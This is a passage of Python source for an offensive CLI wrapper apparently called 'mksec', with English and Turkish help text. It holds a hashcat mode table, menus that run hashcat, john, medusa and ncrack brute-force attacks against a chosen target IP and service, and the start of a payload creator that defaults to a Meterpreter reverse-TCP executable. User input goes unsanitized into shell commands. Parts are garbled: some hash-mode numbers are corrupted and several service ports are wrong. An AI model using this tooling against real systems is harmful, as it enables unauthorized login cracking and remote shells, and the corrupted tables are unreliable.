Network Protocols\n    22001 | WPA-PMK-PMKID+EAPOL                              | Network Protocols\n    16800 | WPA-PMKID-PBKDF2                                 | Network Protocols\n    16801 | WPA-PMKID-PMK                                    | Network Protocols\n     7300 | IPMI2 RAKP HMAC-SHA1                             | Network Protocols\n    10200 | CRAM-MD5                                         | Network Protocols\n     4800 | iSCSI CHAP authentication, MD5(CHAP)             | Network Protocols\n    16500 | JWT (JSON Web Token)                             | Network Protocols\n    22600 | Telegram Desktop App Passcode (PBKDF2-HMAC-SHA1) | Network Protocols\n    22301 | Telegram Mobile App Passcode (SHA256)            | Network Protocols\n     7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth            | Network Protocols\n    13100 | Kerberos 5, etype 23, TGS-REP                    | Network Protocols\n    18200 | Kerberos 5, etype 23, AS-REP                     | Network Protocols\n    19600 | Kerberos 5, etype 17, TGS-REP                    | Network Protocols\n    19700 | Kerberos 5, etype 18, TGS-REP                    | Network Protocols\n    19800 | Kerberos 5, etype 17, Pre-Auth                   | Network Protocols\n  1back00 | Kerberos 5, etype 18, Pre-Auth                   | Network Protocols\n     5500 | NetNTLMv1 / NetNTLMv1+ESS                        | Network Protocols\n     5600 | NetNTLMv2                                        | Network Protocols\n       23 | Skype                                            | Network Protocols\n    11100 | PostgreSQL CRAM (MD5)                            | Network Protocols\n    11200 | MySQL CRAM (SHA1)                                | Network Protocols\n     8500 | RACF                                             | Operating System\n     6300 | AIX {smd5}                                       | Operating System\n     6700 | AIX {ssha1}                                      | Operating System\n     6400 | AIX {ssha256}                                    | Operating System\n     6500 | AIX {ssha512}                                    | Operating System\n     3000 | LM                                               | Operating System\n    19000 | QNX /etc/shadow (MD5)                            | Operating System\n    19100 | QNX /etc/shadow (SHA256)                         | Operating System\n    19200 | QNX /etc/shadow (SHA512)                         | Operating System\n    15300 | DPAPI masterkey file v1                          | Operating System\n    15900 | DPAPI masterkey file v2                          | Operating System\n     7200 | GRUB 2                                           | Operating System\n    12800 | MS-AzureSync PBKDF2-HMAC-SHA256                  | Operating System\n    12400 | BSDi Crypt, Extended DES                         | Operating System\n     1000 | NTLM                                             | Operating System\n      122 | macOS v10.4, macOS v10.5, MacOS v10.6            | Operating System\n     1722 | macOS v10.7                                      | Operating System\n     7100 | macOS v10.8+ (PBKDF2-SHA512)                     | Operating System\n   back00 | Radmin2                                          | Operating System\n     5800 | Samsung Android Password/PIN                     | Operating System\n     3200 | bcrypt $2*$, Blowfish (Unix)                     | Operating System\n      500 | md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)        | Operating System\n     1500 | descrypt, DES (Unix), Traditional DES            | Operating System\n     7400 | sha256crypt $5$, SHA256 (Unix)                   | Operating System\n     1800 | sha512crypt $6$, SHA512 (Unix)                   | Operating System\n    13800 | Windows Phone 8+ PIN/password                    | Operating System\n     2410 | Cisco-ASA MD5                                    | Operating System\n     9200 | Cisco-IOS $8$ (PBKDF2-SHA256)                    | Operating System\n     9300 | Cisco-IOS $9$ (scrypt)                           | Operating System\n     5700 | Cisco-IOS type 4 (SHA256)                        | Operating System\n     2400 | Cisco-PIX MD5                                    | Operating System\n     8100 | Citrix NetScaler (SHA1)                          | Operating System\n    22200 | Citrix NetScaler (SHA512)                        | Operating System\n     1100 | Domain Cached Credentials (DCC), MS Cache        | Operating System\n     2100 | Domain Cached Credentials 2 (DCC2), MS Cache 2   | Operating System\n     7000 | FortiGate (FortiOS)                              | Operating System\n      125 | ArubaOS                                          | Operating System\n      501 | Juniper IVE                                      | Operating System\n       22 | Juniper NetScreen/SSG (ScreenOS)                 | Operating System\n    15100 | Juniper/NetBSD sha1crypt                         | Operating System\n      131 | MSSQL (2000)                                     | Database Server\n      132 | MSSQL (2005)                                     | Database Server\n     1731 | MSSQL (2012, 2014)                               | Database Server\n       12 | PostgreSQL                                       | Database Server\n     3100 | Oracle H: Type (Oracle 7+)                       | Database Server\n      112 | Oracle S: Type (Oracle 11+)                      | Database Server\n    12300 | Oracle T: Type (Oracle 12+)                      | Database Server\n     7401 | MySQL $A$ (sha256crypt)                          | Database Server\n      200 | MySQL323                                         | Database Server\n      300 | MySQL4.1/MySQL5                                  | Database Server\n     8000 | Sybase ASE                                       | Database Server\n     1421 | hMailServer                                      | FTP, HTTP, SMTP, LDAP Server\n     8300 | DNSSEC (NSEC3)                                   | FTP, HTTP, SMTP, LDAP Server\n    16400 | CRAM-MD5 Dovecot                                 | FTP, HTTP, SMTP, LDAP Server\n     1411 | SSHA-256(Base64), LDAP {SSHA256}                 | FTP, HTTP, SMTP, LDAP Server\n     1711 | SSHA-512(Base64), LDAP {SSHA512}                 | FTP, HTTP, SMTP, LDAP Server\n    10901 | RedHat 389-DS LDAP (PBKDF2-HMAC-SHA256)          | FTP, HTTP, SMTP, LDAP Server\n    15000 | FileZilla Server >= 0.9.55                       | FTP, HTTP, SMTP, LDAP Server\n    12600 | ColdFusion 10+                                   | FTP, HTTP, SMTP, LDAP Server\n     1600 | Apache $apr1$ MD5, md5apr1, MD5 (APR)            | FTP, HTTP, SMTP, LDAP Server\n      141 | Episerver 6.x < .NET 4                           | FTP, HTTP, SMTP, LDAP Server\n     1441 | Episerver 6.x >= .NET 4                          | FTP, HTTP, SMTP, LDAP Server\n      101 | nsldap, SHA-1(Base64), Netscape LDAP SHA         | FTP, HTTP, SMTP, LDAP Server\n      111 | nsldaps, SSHA-1(Base64), Netscape LDAP SSHA      | FTP, HTTP, SMTP, LDAP Server\n     7700 | SAP CODVN B (BCODE)                              | Enterprise Application Software (EAS)\n     7701 | SAP CODVN B (BCODE) from RFC_READ_TABLE          | Enterprise Application Software (EAS)\n     7800 | SAP CODVN F/G (PASSCODE)                         | Enterprise Application Software (EAS)\n     7801 | SAP CODVN F/G (PASSCODE) from RFC_READ_TABLE     | Enterprise Application Software (EAS)\n    10300 | SAP CODVN H (PWDSALTEDHASH) iSSHA-1              | Enterprise Application Software (EAS)\n      133 | PeopleSoft                                       | Enterprise Application Software (EAS)\n    13500 | PeopleSoft PS_TOKEN                              | Enterprise Application Software (EAS)\n    21500 | SolarWinds Orion                                 | Enterprise Application Software (EAS)\n     8600 | Lotus Notes/Domino 5                             | Enterprise Application Software (EAS)\n     8700 | Lotus Notes/Domino 6                             | Enterprise Application Software (EAS)\n     9100 | Lotus Notes/Domino 8                             | Enterprise Application Software (EAS)\n    20600 | Oracle Transportation Management (SHA256)        | Enterprise Application Software (EAS)\n     4711 | Huawei sha1(md5($pass).$salt)                    | Enterprise Application Software (EAS)\n    20711 | AuthMe sha256                                    | Enterprise Application Software (EAS)\n    12200 | eCryptfs                                         | Full-Disk Encryption (FDE)\n    22400 | AES Crypt (SHA256)                               | Full-Disk Encryption (FDE)\n    14600 | LUKS                                             | Full-Disk Encryption (FDE)\n    13711 | VeraCrypt RIPEMD160 + XTS 512 bit                | Full-Disk Encryption (FDE)\n    13712 | VeraCrypt RIPEMD160 + XTS 1024 bit               | Full-Disk Encryption (FDE)\n    13713 | VeraCrypt RIPEMD160 + XTS 1536 bit               | Full-Disk Encryption (FDE)\n    13741 | VeraCrypt RIPEMD160 + XTS 512 bit + boot-mode    | Full-Disk Encryption (FDE)\n    13742 | VeraCrypt RIPEMD160 + XTS 1024 bit + boot-mode   | Full-Disk Encryption (FDE)\n    13743 | VeraCrypt RIPEMD160 + XTS 1536 bit + boot-mode   | Full-Disk Encryption (FDE)\n    13751 | VeraCrypt SHA256 + XTS 512 bit                   | Full-Disk Encryption (FDE)\n    13752 | VeraCrypt SHA256 + XTS 1024 bit                  | Full-Disk Encryption (FDE)\n    13753 | VeraCrypt SHA256 + XTS 1536 bit                  | Full-Disk Encryption (FDE)\n    13761 | VeraCrypt SHA256 + XTS 512 bit + boot-mode       | Full-Disk Encryption (FDE)\n    13762 | VeraCrypt SHA256 + XTS 1024 bit + boot-mode      | Full-Disk Encryption (FDE)\n    13763 | VeraCrypt SHA256 + XTS 1536 bit + boot-mode      | Full-Disk Encryption (FDE)\n    13721 | VeraCrypt SHA512 + XTS 512 bit                   | Full-Disk Encryption (FDE)\n    13722 | VeraCrypt SHA512 + XTS 1024 bit                  | Full-Disk Encryption (FDE)\n    13723 | VeraCrypt SHA512 + XTS 1536 bit                  | Full-Disk Encryption (FDE)\n    13771 | VeraCrypt Streebog-512 + XTS 512 bit             | Full-Disk Encryption (FDE)\n    13772 | VeraCrypt Streebog-512 + XTS 1024 bit            | Full-Disk Encryption (FDE)\n    13773 | VeraCrypt Streebog-512 + XTS 1536 bit            | Full-Disk Encryption (FDE)\n    13731 | VeraCrypt Whirlpool + XTS 512 bit                | Full-Disk Encryption (FDE)\n    13732 | VeraCrypt Whirlpool + XTS 1024 bit               | Full-Disk Encryption (FDE)\n    13733 | VeraCrypt Whirlpool + XTS 1536 bit               | Full-Disk Encryption (FDE)\n    16700 | FileVault 2                                      | Full-Disk Encryption (FDE)\n    20011 | DiskCryptor SHA512 + XTS 512 bit                 | Full-Disk Encryption (FDE)\n    20012 | DiskCryptor SHA512 + XTS 1024 bit                | Full-Disk Encryption (FDE)\n    20013 | DiskCryptor SHA512 + XTS 1536 bit                | Full-Disk Encryption (FDE)\n    22100 | BitLocker                                        | Full-Disk Encryption (FDE)\n    12900 | Android FDE (Samsung DEK)                        | Full-Disk Encryption (FDE)\n     8800 | Android FDE <= 4.3                               | Full-Disk Encryption (FDE)\n    18300 | Apple File System (APFS)                         | Full-Disk Encryption (FDE)\n     6211 | TrueCrypt RIPEMD160 + XTS 512 bit                | Full-Disk Encryption (FDE)\n     6212 | TrueCrypt RIPEMD160 + XTS 1024 bit               | Full-Disk Encryption (FDE)\n     6213 | TrueCrypt RIPEMD160 + XTS 1536 bit               | Full-Disk Encryption (FDE)\n     6241 | TrueCrypt RIPEMD160 + XTS 512 bit + boot-mode    | Full-Disk Encryption (FDE)\n     6242 | TrueCrypt RIPEMD160 + XTS 1024 bit + boot-mode   | Full-Disk Encryption (FDE)\n     6243 | TrueCrypt RIPEMD160 + XTS 1536 bit + boot-mode   | Full-Disk Encryption (FDE)\n     6221 | TrueCrypt SHA512 + XTS 512 bit                   | Full-Disk Encryption (FDE)\n     6222 | TrueCrypt SHA512 + XTS 1024 bit                  | Full-Disk Encryption (FDE)\n     6223 | TrueCrypt SHA512 + XTS 1536 bit                  | Full-Disk Encryption (FDE)\n     6231 | TrueCrypt Whirlpool + XTS 512 bit                | Full-Disk Encryption (FDE)\n     6232 | TrueCrypt Whirlpool + XTS 1024 bit               | Full-Disk Encryption (FDE)\n     6233 | TrueCrypt Whirlpool + XTS 1536 bit               | Full-Disk Encryption (FDE)\n    10400 | PDF 1.1 - 1.3 (Acrobat 2 - 4)                    | Documents\n    10410 | PDF 1.1 - 1.3 (Acrobat 2 - 4), collider #1       | Documents\n    10420 | PDF 1.1 - 1.3 (Acrobat 2 - 4), collider #2       | Documents\n    10500 | PDF 1.4 - 1.6 (Acrobat 5 - 8)                    | Documents\n    10600 | PDF 1.7 Level 3 (Acrobat 9)                      | Documents\n    10700 | PDF 1.7 Level 8 (Acrobat 10 - 11)                | Documents\n     9400 | MS Office 2007                                   | Documents\n     9500 | MS Office 2010                                   | Documents\n     9600 | MS Office 2013                                   | Documents\n     9700 | MS Office <= 2003 $0/$1, MD5 + RC4               | Documents\n     9710 | MS Office <= 2003 $0/$1, MD5 + RC4, collider #1  | Documents\n     9720 | MS Office <= 2003 $0/$1, MD5 + RC4, collider #2  | Documents\n     9800 | MS Office <= 2003 $3/$4, SHA1 + RC4              | Documents\n     9810 | MS Office <= 2003 $3, SHA1 + RC4, collider #1    | Documents\n     9820 | MS Office <= 2003 $3, SHA1 + RC4, collider #2    | Documents\n    18400 | Open Document Format (ODF) 1.2 (SHA-256, AES)    | Documents\n    18600 | Open Document Format (ODF) 1.1 (SHA-1, Blowfish) | Documents\n    16200 | Apple Secure Notes                               | Documents\n    15500 | JKS Java Key Store Private Keys (SHA1)           | Password Managers\n     6600 | 1Password, agilekeychain                         | Password Managers\n     8200 | 1Password, cloudkeychain                         | Password Managers\n     9000 | Password Safe v2                                 | Password Managers\n     5200 | Password Safe v3                                 | Password Managers\n     6800 | LastPass + LastPass sniffed                      | Password Managers\n    13400 | KeePass 1 (AES/Twofish) and KeePass 2 (AES)      | Password Managers\n    11300 | Bitcoin/Litecoin wallet.dat                      | Password Managers\n    16600 | Electrum Wallet (Salt-Type 1-3)                  | Password Managers\n    21700 | Electrum Wallet (Salt-Type 4)                    | Password Managers\n    21800 | Electrum Wallet (Salt-Type 5)                    | Password Managers\n    12700 | Blockchain, My Wallet                            | Password Managers\n    15200 | Blockchain, My Wallet, V2                        | Password Managers\n    18800 | Blockchain, My Wallet, Second Password (SHA256)  | Password Managers\n    23100 | Apple Keychain                                   | Password Managers\n    16300 | Ethereum Pre-Sale Wallet, PBKDF2-HMAC-SHA256     | Password Managers\n    15600 | Ethereum Wallet, PBKDF2-HMAC-SHA256              | Password Managers\n    15700 | Ethereum Wallet, SCRYPT                          | Password Managers\n    22500 | MultiBit Classic .key (MD5)                      | Password Managers\n    22700 | MultiBit HD (scrypt)                             | Password Managers\n    11600 | 7-Zip                                            | Archives\n    12500 | RAR3-hp                                          | Archives\n    13000 | RAR5                                             | Archives\n    17200 | PKZIP (Compressed)                               | Archives\n    17220 | PKZIP (Compressed Multi-File)                    | Archives\n    17225 | PKZIP (Mixed Multi-File)                         | Archives\n    17230 | PKZIP (Mixed Multi-File Checksum-Only)           | Archives\n    17210 | PKZIP (Uncompressed)                             | Archives\n    20500 | PKZIP Master Key                                 | Archives\n    20510 | PKZIP Master Key (6 byte optimization)           | Archives\n    14700 | iTunes backup < 10.0                             | Archives\n    14800 | iTunes backup >= 10.0                            | Archives\n    23001 | SecureZIP AES-128                                | Archives\n    23002 | SecureZIP AES-192                                | Archives\n    23003 | SecureZIP AES-256                                | Archives\n    13600 | WinZip                                           | Archives\n    18900 | Android Backup                                   | Archives\n    13200 | AxCrypt                                          | Archives\n    13300 | AxCrypt in-memory SHA1                           | Archives\n     8400 | WBB3 (Woltlab Burning Board)                     | Forums, CMS, E-Commerce\n     2611 | vBulletin < v3.8.5                               | Forums, CMS, E-Commerce\n     2711 | vBulletin >= v3.8.5                              | Forums, CMS, E-Commerce\n     2612 | PHPS                                             | Forums, CMS, E-Commerce\n      121 | SMF (Simple Machines Forum) > v1.1               | Forums, CMS, E-Commerce\n     3711 | MediaWiki B type                                 | Forums, CMS, E-Commerce\n     4521 | Redmine                                          | Forums, CMS, E-Commerce\n       11 | Joomla < 2.5.18                                  | Forums, CMS, E-Commerce\n    13900 | OpenCart                                         | Forums, CMS, E-Commerce\n    11000 | PrestaShop                                       | Forums, CMS, E-Commerce\n    16000 | Tripcode                                         | Forums, CMS, E-Commerce\n     7900 | Drupal7                                          | Forums, CMS, E-Commerce\n       21 | osCommerce, xt:Commerce                          | Forums, CMS, E-Commerce\n     4522 | PunBB                                            | Forums, CMS, E-Commerce\n     2811 | MyBB 1.2+, IPB2+ (Invision Power Board)          | Forums, CMS, E-Commerce\n    18100 | TOTP (HMAC-SHA1)                                 | One-Time Passwords\n     2000 | STDOUT                                           | Plaintext\nbackback9 | Plaintext                                        | Plaintext\n    21600 | Web2py pbkdf2-sha512                             | Framework\n    10000 | Django (PBKDF2-SHA256)                           | Framework\n      124 | Django (SHA-1)                                   | Framework\n")
            elif "--brute" in uinput.lower():
                print("? | \x1b[33mCharset\x1b[37m\n==+=========\nl | abcdefghijklmnopqrstuvwxyzu | ABCDEFGHIJKLMNOPQRSTUVWXYZ\nd | 0123456789\nh | 0123456789abcdef\nH | 0123456789ABCDEF\ns |  !#*+,-.^_`{|}\na | ?l?u?d?s\nb | 0x00 - 0xff\n\n\x1b[33mUsage:\x1b[37m\n\x1b[33m======\x1b[37m\n\x1b[32mex:\x1b[37m mert123* = ?l?l?l?l?d?d?d?s\n\x1b[32mex:\x1b[37m mert123* = ?a?a?a?a?a?a?a?a")
            elif "run" == uinput.lower():
                print("\x1b[1m\x1b[31m'Command not found. You can check the run command by typing 'info'\x1b[1m")
            elif "run -w" == uinput.lower():
                os.system("sudo hashcat -a 0 -m " + hashmode + " " + hash + " " + wordlist)
            elif "run -b" == uinput.lower():
                os.system("sudo hashcat -a 3 -m " + hashmode + " " + hash + " " + bruteforce)

    def john():
        hashlist = "                         "
        search = "                         "
        format = "                         "
        wordlist = "                         "
        hash = "                         "
        while 1:
            uinput = input("\x1b[1m\033[36m[mksec]\033[36m[john]\033[37m\x1b[0m ")
            UserInputs(uinput+"pass")
            if uinput.lower() == "info":
                print("\x1b[1m\x1b[33mEN:\x1b[37mIt breaks one-way encryption algorithms (hashes) with wordlist.\nUsage:\nYou do not need to fill in \x1b[36m'LIST'\x1b[37m to see the hash list. Just type \x1b[36m'run --hash list' \x1b[37mor \x1b[36m'run -hl'\x1b[37m.\nTo search in the hash list, fill in \x1b[36m'FIND'\x1b[37m and type \x1b[32m'run --search' \x1b[36mor\x1b[37m 'run -s'\x1b[37m.\nTo hash hash using Wordlist, fill in \x1b[36m'FORMAT'\x1b[37m, \x1b[36m'WORDLIST'\x1b[37m and \x1b[36m'HASH'\x1b[37m and type \x1b[36m'run -x'\x1b[37m.\n\n\x1b[33mTR:\x1b[37mWordlist ile tek yönlü şifreleme algoritmalarını (hashes) kırar. \nKullanımı:\nHash listesini görmek için \x1b[36m'LIST'\x1b[37m kısmını doldurmanıza gerek yoktur. Sadece \x1b[36m'run --hash list'\x1b[37m ya da \x1b[36m'run -hl'\x1b[37m yazın.\nHash listesi içerisinde arama yapmak için \x1b[36m'FIND'\x1b[37m kısmını doldurun ve \x1b[36m'run --search'\x1b[37m or \x1b[36m'run -s'\x1b[37m yazın.\nWordlist kullanarak hash kırmak için \x1b[36m'FORMAT'\x1b[37m, \x1b[36m'WORDLIST'\x1b[37m ve \x1b[36m'HASH'\x1b[37m kısımlarını doldurup \x1b[36m'run -x'\x1b[37m yazın.\n")
            elif uinput.lower() == "options":
                print("\x1b[1m\x1b[33mOption\x1b[37m       \x1b[33mCurrent Setting\x1b[37m      \x1b[33mRequirement\x1b[37m     \x1b[33mDescription\x1b[37m\n\x1b[33m=======\x1b[37m      \x1b[33m===============\x1b[37m      \x1b[33m===========\x1b[37m     \x1b[33m============\x1b[37m\nLIST    {}    NO           Lists hashes that can be cracked. \x1b[33musage: 'run --hash list' or 'run -hl'\x1b[37m\nFIND    {}    NO           Searches within breakable hashes \x1b[32mex: MD5\x1b[37m \x1b[33musage: 'run --search' or 'run -s'\x1b[37m\nFORMAT  {}    YES          Specify the hash format \x1b[32mex: Raw-MD5\x1b[37m\nWORDLIST{}    YES          Specify the wordlist you will use to crack the hash \x1b[32mex: /root/Desktop/wordlist.txt\x1b[37m\nHASH    {}    YES          Enter the file with hash in it \x1b[32mex: /root/Desktop/hash.txt\x1b[37m".format(hashlist[::-1],search,format,wordlist,hash))
            elif "set list" in uinput.lower():
                hashlist = uinput
                hashlist = hashlist.replace("set list ","").replace("set LIST ","").replace("SET list ","").replace("SET LIST ","").center(25)
            elif "set find" in uinput.lower():
                search = uinput
                search = search.replace("set find ","").replace("set FIND ","").replace("SET find ","").replace("SET FIND ","").center(25)
            elif "set format" in uinput.lower():
                format = uinput
                format = format.replace("set format ","").replace("set FORMAT ","").replace("SET format ","").replace("SET FORMAT ","").center(25)
            elif "set wordlist" in uinput.lower():
                wordlist = uinput
                wordlist = wordlist.replace("set wordlist ","").replace("set WORDLIST ","").replace("SET wordlist ","").replace("SET WORDLIST ","").center(25)
            elif "set hash" in uinput.lower():
                hash = uinput
                hash = hash.replace("set hash ","").replace("set HASH ","").replace("SET hash ","").replace("SET HASH ","").center(25)
            elif "run" == uinput.lower():
                print("\x1b[1m\x1b[31mCommand not found. You can check the run command by typing 'info'\x1b[1m")
            elif "run --hash list" == uinput.lower() or "run -hl" == uinput.lower():
                os.system("john --list=formats")
            elif "run --search" == uinput.lower() or "run -s" == uinput.lower():
                os.system("john --list=formats | grep -i " + search.strip())
            elif "run -x" == uinput.lower():
                os.system("john --format=" + format.strip() + " --wordlist=" + wordlist.strip() + " " + hash.strip())

    def medusa():
        ip = "                         "
        service = "                         "
        userlist = "                         "
        passlist = "                         "
        while 1:
            uinput = input("\x1b[1m\033[36m[mksec]\033[36m[medusa]\033[37m\x1b[0m ")
            UserInputs(uinput+"pass")
            if uinput.lower() == "info":
                print("\x1b[1m\x1b[33mEN:\x1b[37mWordlist attack on services.\n\x1b[33mTR:\x1b[37mServislere yönelik wordlist saldırısı.")
            elif uinput.lower() == "options":
                print("\x1b[1m\x1b[33mOption\x1b[37m            \x1b[33mCurrent Setting\x1b[37m               \x1b[33mRequirement\x1b[37m     \x1b[33mDescription\x1b[37m\n\x1b[33m=======\x1b[37m           \x1b[33m===============\x1b[37m               \x1b[33m===========\x1b[37m     \x1b[33m============\x1b[37m\nIP         {}               YES          Target ip address \x1b[32mex: 108.96.10.8\x1b[37m\nSERVICE    {}               YES          Which service? \x1b[32mex: ftp\x1b[37m\nUSERLIST   {}               YES          Enter a wordlist with usernames \x1b[32mex: /root/Desktop/username.txt\x1b[37m\nPASSLIST   {}               YES          Enter a wordlist with passwords \x1b[32mex: /root/Desktop/passwords.txt\x1b[37m".format(ip,service,userlist,passlist))
            elif "set ip" in uinput.lower():
                ip = uinput
                ip = ip.replace("set ip ","").replace("set IP ","").replace("SET ip ","").replace("SET IP ","").center(25)
            elif "set service" in uinput.lower():
                service = uinput
                service = service.replace("set service ","").replace("set SERVICE ","").replace("SET service ","").replace("SET SERVICE ","").center(25)
            elif "set userlist" in uinput.lower():
                userlist = uinput
                userlist = userlist.replace("set userlist ","").replace("set USERLIST ","").replace("SET userlist ","").replace("SET USERLIST ","").center(25)
            elif "set passlist" in uinput.lower():
                passlist = uinput
                passlist = passlist.replace("set passlist ","").replace("set PASSLIST ","").replace("SET passlist ","").replace("SET PASSLIST ","").center(25)
            elif "run" == uinput.lower():
                os.system("sudo medusa -h " + ip.strip() + " -M " + service.strip() + " -U " + userlist.strip() + " -P " + passlist.strip())
                print("Process Completed")

    def ncrack():
        ip = "                         "
        port = "                         "
        userlist = "                         "
        passlist = "                         "
        while 1:
            uinput = input("\x1b[1m\033[36m[mksec]\033[36m[ncrack]\033[37m\x1b[0m ")
            UserInputs(uinput+"pass")
            if uinput.lower() == "info":
                print("\x1b[1m\x1b[33mEN:\x1b[37mWordlist attack on services.\n\x1b[33mTR:\x1b[37mServislere yönelik wordlist saldırısı.")
            elif uinput.lower() == "options":
                print("\x1b[1m\x1b[33mOption\x1b[37m            \x1b[33mCurrent Setting\x1b[37m               \x1b[33mRequirement\x1b[37m     \x1b[33mDescription\x1b[37m\n\x1b[33m=======\x1b[37m           \x1b[33m===============\x1b[37m               \x1b[33m===========\x1b[37m     \x1b[33m============\x1b[37m\nIP         {}               YES          Target ip address \x1b[32mex: 108.96.10.8\x1b[37m\nPORT       {}               YES          Which service? Type \x1b[33m'--services and ports' \x1b[35mor\x1b[33m '-sap'\x1b[37m to see the ports used by the services. \x1b[32mex: ftp\x1b[37m\nUSERLIST   {}               YES          Enter a word list with usernames in it \x1b[32mex: /root/Desktop/username.txt\x1b[37m\nPASSLIST   {}               YES          Enter a word list with passwords \x1b[32mex: /root/Desktop/passwords.txt\x1b[37m".format(ip,port,userlist,passlist))
            elif "set ip" in uinput.lower():
                ip = uinput
                ip = ip.replace("set ip ","").replace("set IP ","").replace("SET ip ","").replace("SET IP ","").center(25)
            elif "set port" in uinput.lower():
                port = uinput
                port = port.replace("set port ","").replace("set PORT ","").replace("SET port ","").replace("SET PORT ","").center(25)
            elif "set userlist" in uinput.lower():
                userlist = uinput
                userlist = userlist.replace("set userlist ","").replace("set USERLIST ","").replace("SET userlist ","").replace("SET USERLIST ","").center(25)
            elif "set passlist" in uinput.lower():
                passlist = uinput
                passlist = passlist.replace("set passlist ","").replace("set PASSLIST ","").replace("SET passlist ","").replace("SET PASSLIST ","").center(25)
            elif "--services and ports" == uinput.lower() or "-sap" == uinput.lower():
                print("\x1b[1m\nFTP = \x1b[33m21\x1b[37m\nSSH = \x1b[33m22\x1b[37m\nTelnet = \x1b[33m23\x1b[37m\nVNC = \x1b[33m5900\x1b[37m\nRPD = \x1b[33m3989\x1b[37m\nMySQL = \x1b[33m3306\x1b[37m\nPostgreSQL = \x1b[33m5432\x1b[37m\nMSSQL = \x1b[33z1433\x1b[37m\nMongoDB = \x1b[33m27017\x1b[37m\nSMB = \x1b[33m'139' \x1b[35mor\x1b[33m '445'\x1b[37m\nHTTP(S) = \x1b[33m'80' \x1b[35mor\x1b[33m '443'\x1b[37m\nPOP3(S) = \x1b[33m'110' \x1b[35mor\x1b[33m '995'\x1b[37m\nIMAP = \x1b[33m143\x1b[37m\nCVS = \x1b[33m2401\x1b[37m\nMQTT = \x1b[33m143\x1b[37m\nDICOM = \x1b[33m1883\x1b[37m\nSIP = \x1b[33m5060\x1b[37m\nRedis = \x1b[33m6379\x1b[37m\nCassandra = \x1b[33m9042\x1b[37m\n")
            elif "run" == uinput.lower():
                os.system("sudo ncrack -p " + port.strip() + " -U " + userlist.strip() + " -P " + passlist.strip() + " " + ip.strip())
                print("Process Completed")

    def hashIdentifier():
        search = "                                                  "
        while 1:
            uinput = input("\x1b[1m\033[36m[mksec]\033[36m[hash-identifier]\033[37m\x1b[0m ")
            UserInputs(uinput+"pass")
            if uinput.lower() == "info":
                print("\x1b[1m\x1b[33mEN:\x1b[37mHash Identifier is a tool that detects the encrypted hash algorithm. \x1b[36m'run'\x1b[37m command does not work, try with \x1b[36m'run -f'\x1b[37m (-f : --force). \n\x1b[33mTR:\x1b[37mHash Identifier, kriptolanan hash/şifre algoritmasını tespit eden bir araçtır. \x1b[36m'run'\x1b[37m komutu çalışmazsa \x1b[36m'run -f'\x1b[37m (-f : --force) ile deneyiniz.")
            elif uinput.lower() == "options":
                print("\x1b[1m\x1b[33mOption\x1b[37m            \x1b[33mCurrent Setting\x1b[37m                        \x1b[33mRequirement\x1b[37m     \x1b[33mDescription\x1b[37m\n\x1b[33m=======\x1b[37m           \x1b[33m===============\x1b[37m                        \x1b[33m===========\x1b[37m     \x1b[33m============\x1b[37m\nSEARCH{}     YES         Hash value \x1b[32mex: 55e8bb2e1b456ebbec8ae5ba64311a2c\x1b[37m".format(search))
            elif "set search" in uinput.lower():
                search = uinput
                search = search.replace("set search ","").replace("set SEARCH ","").replace("SET search ","").replace("SET SEARCH ","").center(50)
            elif "run" == uinput.lower():
                os.system("hash-identifier " + search.strip())
                print("Process Completed")
            elif "run -f" == uinput.lower():
                os.system("hashid " + search.strip())
                print("Process Completed")

    def wordlists():
        kernel = os.popen('uname -v').read().split(" ")[3]
        if "kali" in kernel:
            while 1:
                os.system("clear")
                print("\x1b[1m\n\x1b[31m*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*\x1b[33mWordlist Files\x1b[31m*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*\x1b[37m\n\n\x1b[0m\x1b[2m")
                os.system("locate wordlist")
                print("\x1b[1m\n\n\x1b[31m*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*\x1b[33mWordlist Directories\x1b[31m*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*\x1b[37m\n\n\x1b[0m\x1b[2m")
                os.system("cd /usr/share/wordlists && ls -l")
                print("\x1b[1m")
                r = input('Press "q" to exit\n\n\x1b[1m\033[36m[mksec]\033[36m[wordlist]\033[37m\x1b[0m ')
                if r == "q":
                    os.system("clear")
                    passwordAttacks()
        else:
            while 1:
                print("\x1b[1m\x1b[36mEN:\x1b[31mOnly for those using the kali linux operating system.\n\x1b[36mTR:\x1b[31mSadece kali linux işletim sistemini kullananlar için.")
                uinput = input("\x1b[1m\033[36m[mksec]\033[36m[wordlist]\033[37m\x1b[0m ")
                UserInputs(uinput+"pass")

    def PayloadCreatorAndListener():
        def PayloadCreater():
            payload = "         windows/meterpreter/reverse_tcp          "
            host = "                       <IP>                       "
            port = "                       4444                       "
            format = "                       exe                        "
            output = "                                                  "
            youriface = os.popen('ip addr').read().split("2:")[1].split(":")[0]
            ipv4 = os.popen('ip addr show {}'.format(youriface)).read().split("inet ")[1].split("/")[0]
            while 1:
                uinput = input("\x1b[1m\033[36m[mksec]\033[36m[payload_creator]\033[37m\x1b[0m ")
                UserInputs(uinput+"exp")
                if uinput.lower() == "info":
                    print("\x1b[1m\x1b[33mEN:\x1b[37mIt is a payload creator. \x1b[36m'run'\x1b[37m command does not work, try with \x1b[36m'run -f'\x1b[37m (-f : --force). \n\x1b[33mTR:\x1b[37mBir payload üretme aracıdır. \x1b[36m'run'\x1b[37m komutu çalışmazsa \x1b[36m'run -f'\x1b[37m (-f : --force) ile deneyiniz.")
                elif uinput.lower() == "options":
